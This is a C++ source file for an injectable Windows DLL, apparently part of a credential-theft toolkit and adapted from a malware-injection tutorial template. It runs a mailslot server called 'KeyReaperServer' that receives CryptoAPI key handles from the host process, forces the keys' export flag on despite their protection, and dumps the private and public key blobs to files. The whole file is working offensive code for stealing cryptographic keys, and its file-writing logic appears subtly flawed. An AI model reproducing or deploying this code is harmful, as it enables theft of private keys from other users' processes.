/*
Template auhtor
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#include <wincrypt.h>
#include <fstream>
#include <string>
#pragma comment (lib, "user32.lib")

#include "program_result.h"
using ErrorResult = error_handling::ErrorResult;
using OkResult = error_handling::OkResult;

#include "cryptoapi.h"
#include "injection/interproc_coms.h"
using namespace custom_ipc;

DWORD timeout_millis = 20000;

int StartMailSlot();

extern "C" __declspec(dllexport) void StartMailSlotExporter(LPVOID lpParam) {
  printf("Started mailslot\n");
  StartMailSlot();
}

extern "C" __declspec(dllexport) void StartServer(LPVOID lpParam) {
  // StartMailSlot();
  NamedPipeServer server = NamedPipeServer(kPipeName, timeout_millis);
  // ShowGUIMessage("Creating server");
  server.CreateServer();
  // ShowGUIMessage("Waiting for connection");
  error_handling::ProgramResult pr = server.WaitForConnection();
  // ShowGUIMessage(pr.GetResultInformation());
  if (pr.IsOk()) {
    // ShowGUIMessage("Entering server loop");
    server.ServerLoop();
  } // else ShowGUIMessage("Did not enter server loop due to previous error");
  // ShowGUIMessage("Closing server");
  server.CloseServer();
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    // ShowGUIMessage("DLL loaded in process");
    printf("PID: %u\n", GetCurrentProcessId());
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}

#include <wincrypt.h>
#include <iostream>
#define PRIVATEKEYBLOB_SIZE 0x254
int StartMailSlot() {
  // Create the mailslot
  LPCSTR slot_name = "\\\\.\\mailslot\\KeyReaperServer";
  HANDLE hMailslot = CreateMailslotA(slot_name, sizeof(HCRYPTKEY), MAILSLOT_WAIT_FOREVER, NULL);
  if (hMailslot == INVALID_HANDLE_VALUE) {
    std::cerr << "Failed to create mailslot. The server might already be running. \nError: " << GetLastError() << std::endl;
    return 1;
  }
  std::cout << "Mailslot created. Waiting for messages..." << std::endl;

  while (true) {
    DWORD bytesRead;
    // unsigned char* buffer = (unsigned char*) malloc(sizeof(HCRYPTKEY));
    auto buffer = std::vector<BYTE>(sizeof(HCRYPTKEY), 0);

    if (ReadFile(hMailslot, buffer.data(), sizeof(HCRYPTKEY), &bytesRead, NULL)) {
      std::cout << "Received message: ";
      for (SIZE_T i = 0; i < bytesRead; ++i) {
        printf("%02X ", buffer[i]);
      } printf("\n");
      
      HCRYPTKEY key = *(reinterpret_cast<HCRYPTKEY*>(buffer.data()));
      key_scanner::cryptoapi::ForceExportBit(key);

      printf("Exporting key: 0x%p\n", (void*) key);
      printf(" Exporting PRIVATEKEYBLOB\n");
      BYTE key_buffer[PRIVATEKEYBLOB_SIZE];
      ZeroMemory(key_buffer, PRIVATEKEYBLOB_SIZE);
      DWORD data_len = PRIVATEKEYBLOB_SIZE;
      BOOL res = CryptExportKey(
        key,
        NULL,
        PRIVATEKEYBLOB,
        0,
        key_buffer,
        &data_len
      );

      if (res == 0) std::cerr << " [x] Could not export PRIVATE pair: " << error_handling::GetLastErrorAsString() << std::endl;
      else {
        printf(" [i] Key successfully exported, exporting it to a file\n");
        std::ofstream file("key.privk", std::ios::binary);
        if (file) {
          file.write(reinterpret_cast<const char*>(buffer.data()), data_len);
        } else printf(" [x] Could not open file\n");
      }

      printf(" Exporting PUBLICKEYBLOB\n");
      ZeroMemory(key_buffer, PRIVATEKEYBLOB_SIZE);
      data_len = PRIVATEKEYBLOB_SIZE;
      res = CryptExportKey(
        key,
        NULL,
        PUBLICKEYBLOB,
        0,
        key_buffer,
        &data_len
      );

      if (res == 0) std::cerr << " [x] Could not export PUBLIC pair: " << error_handling::GetLastErrorAsString() << std::endl;
      else {
        printf(" [i] Key successfully exported, exporting it to a file\n");
        std::ofstream file("key.pubk", std::ios::binary);
        if (file) {
          file.write(reinterpret_cast<const char*>(buffer.data()), data_len);
        } else printf(" [x] Could not open file");
      }

    } else {
      std::cerr << "Failed to read from mailslot. Error: " << GetLastError() << std::endl;
    }
  }

  CloseHandle(hMailslot);
  return 0;
}